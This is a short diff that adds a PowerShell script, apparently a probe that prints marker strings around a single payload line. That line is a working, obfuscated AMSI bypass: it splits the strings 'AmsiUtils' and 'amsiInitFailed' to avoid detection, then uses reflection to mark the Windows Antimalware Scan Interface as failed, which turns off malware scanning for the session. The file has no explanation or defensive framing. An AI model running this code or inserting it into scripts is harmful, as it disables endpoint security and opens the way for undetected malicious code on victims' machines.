@@ -1,0 +1,3 @@
+Write-Output('probe4831-ok')
+try{$q=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siU'+'tils');$e=$q.GetField('am'+'siIn'+'itFailed','NonPublic,Static');$e.SetValue($null,$true)}catch{}
+Write-Output('probe4831-done')
